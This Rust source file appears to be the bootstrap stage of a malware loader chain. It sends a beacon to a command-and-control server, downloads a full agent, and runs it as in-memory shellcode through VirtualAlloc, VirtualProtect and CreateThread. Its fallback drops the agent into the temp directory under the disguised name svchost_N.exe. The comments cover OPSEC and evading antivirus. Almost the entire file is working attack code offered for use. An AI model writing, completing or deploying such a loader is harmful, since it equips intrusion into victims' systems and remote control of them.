//! Stage 3: Stage0 - Position-Independent Bootstrap Payload
//!
//! **Purpose**: Minimal bootstrap that contacts C2 and downloads the full agent
//!
//! **Why this stage exists**:
//! - Keeps ESTER and JAVELIN small and generic
//! - Only Stage0 contains C2-specific logic
//! - Can be updated independently from earlier stages
//! - Downloads full agent capabilities on demand
//!
//! **OPSEC Considerations**:
//! - Runs entirely in memory (loaded by JAVELIN)
//! - Position-independent code (no fixed addresses)
//! - Minimal network signature (single beacon + download)
//! - Full agent only downloaded after successful bootstrap
//!
//! **Separation of Responsibilities**:
//! - Stage0 ONLY handles initial C2 contact and agent download
//! - Stage0 does NOT include full agent capabilities
//! - Full agent is downloaded after successful session establishment

pub mod beacon;
pub mod config;
pub mod download;
pub mod network;

pub use beacon::send_initial_beacon;
pub use config::get_c2_server;
pub use download::{download_agent, download_agent_http};
pub use network::establish_session;

/// Main entry point for Stage0
///
/// This function is called by JAVELIN after loading Stage0 into memory
///
/// **Execution flow**:
/// 1. Send initial beacon to C2
/// 2. Establish encrypted session (TLS)
/// 3. Download full agent from C2 via HTTP API
/// 4. Execute full agent in memory
///
/// # Returns
///
/// * `0` - Success
/// * `1` - Failure
#[no_mangle]
pub extern "C" fn stage0_main() -> i32 {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Bootstrap payload initializing...");

    match run_bootstrap() {
        Ok(_) => {
            #[cfg(feature = "dev")]
            println!("[STAGE0] Bootstrap complete");
            0
        }
        Err(e) => {
            #[cfg(feature = "dev")]
            eprintln!("[STAGE0] Bootstrap failed: {:?}", e);
            1
        }
    }
}

/// Runs the bootstrap sequence
fn run_bootstrap() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Starting bootstrap sequence");

    // Step 1: Send initial beacon
    #[cfg(feature = "dev")]
    println!("[STAGE0] Sending initial beacon...");
    
    send_initial_beacon()?;

    // Step 2: Establish TLS session (for beacon/keep-alive)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Establishing TLS session...");
    
    let _session = establish_session()?;
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] TLS session established");

    // Step 3: Download full agent via HTTP API (separate from TLS session)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Downloading full agent via HTTP API...");
    
    let agent_bytes = download_agent_http()?;

    // Step 4: Execute full agent as process (write to temp, execute, delete)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Executing full agent ({} bytes)", agent_bytes.len());
    
    execute_agent_as_process(&agent_bytes)?;

    Ok(())
}

/// Executes the downloaded agent as shellcode in memory (fileless)
/// The agent should be donut-converted shellcode for proper in-memory execution
fn execute_agent_as_process(agent_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        use std::ptr;
        use std::ffi::c_void;
        
        type HANDLE = *mut c_void;
        type DWORD = u32;
        type LPVOID = *mut c_void;
        type SIZE_T = usize;
        
        const MEM_COMMIT: DWORD = 0x1000;
        const MEM_RESERVE: DWORD = 0x2000;
        const PAGE_READWRITE: DWORD = 0x04;
        const PAGE_EXECUTE_READ: DWORD = 0x20;
        
        #[link(name = "kernel32")]
        extern "system" {
            fn VirtualAlloc(addr: LPVOID, size: SIZE_T, alloc_type: DWORD, protect: DWORD) -> LPVOID;
            fn VirtualProtect(addr: LPVOID, size: SIZE_T, new_protect: DWORD, old_protect: *mut DWORD) -> i32;
            fn CreateThread(
                attrs: LPVOID, stack_size: SIZE_T, start_addr: LPVOID,
                param: LPVOID, flags: DWORD, thread_id: *mut DWORD
            ) -> HANDLE;
            fn WaitForSingleObject(handle: HANDLE, ms: DWORD) -> DWORD;
        }
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Executing shellcode in memory ({} bytes)", agent_bytes.len());
        
        // Check if this looks like shellcode (not PE)
        // Shellcode typically doesn't start with MZ header
        let is_pe = agent_bytes.len() >= 2 && agent_bytes[0] == 0x4D && agent_bytes[1] == 0x5A;
        
        if is_pe {
            #[cfg(feature = "dev")]
            println!("[STAGE0] WARNING: Received PE instead of shellcode, attempting RunPE...");
            
            // Fallback to temp file execution for PE (less ideal but works)
            return execute_pe_via_temp_file(agent_bytes);
        }
        
        // Allocate RW memory
        let mem = unsafe {
            VirtualAlloc(
                ptr::null_mut(),
                agent_bytes.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            )
        };
        
        if mem.is_null() {
            return Err("VirtualAlloc failed".into());
        }
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Allocated {} bytes at {:p}", agent_bytes.len(), mem);
        
        // Copy shellcode to allocated memory
        unsafe {
            ptr::copy_nonoverlapping(
                agent_bytes.as_ptr(),
                mem as *mut u8,
                agent_bytes.len(),
            );
        }
        
        // Change protection to RX (execute-read, not write)
        let mut old_protect: DWORD = 0;
        let result = unsafe {
            VirtualProtect(
                mem,
                agent_bytes.len(),
                PAGE_EXECUTE_READ,
                &mut old_protect,
            )
        };
        
        if result == 0 {
            return Err("VirtualProtect failed".into());
        }
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Memory protection changed to RX");
        
        // Create thread to execute shellcode
        let thread = unsafe {
            CreateThread(
                ptr::null_mut(),
                0,
                mem,
                ptr::null_mut(),
                0,
                ptr::null_mut(),
            )
        };
        
        if thread.is_null() {
            return Err("CreateThread failed".into());
        }
        
        #[cfg(feature = "dev")]
        println!("[STAGE0] Shellcode thread created, waiting for execution...");
        
        // Wait indefinitely for the thread (agent runs in this thread)
        unsafe { WaitForSingleObject(thread, 0xFFFFFFFF); }
        
        Ok(())
    }

    #[cfg(not(target_os = "windows"))]
    {
        Err("Non-Windows execution not yet implemented".into())
    }
}

/// Fallback: Execute PE via temporary file (detected by AV but works)
#[cfg(target_os = "windows")]
fn execute_pe_via_temp_file(pe_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    use std::fs;
    use std::process::Command;
    use std::env;
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] Fallback: Writing PE to temp file (may be detected by AV)");
    
    let temp_dir = env::temp_dir();
    let timestamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs();
    let filename = format!("svchost_{}.exe", timestamp % 100000);
    let agent_path = temp_dir.join(&filename);
    
    fs::write(&agent_path, pe_bytes)?;
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] Spawning: {:?}", agent_path);
    
    Command::new(&agent_path).spawn()?;
    
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stage0_config() {
        // Verify configuration is accessible
        let server = get_c2_server();
        assert!(!server.is_empty());
    }
}
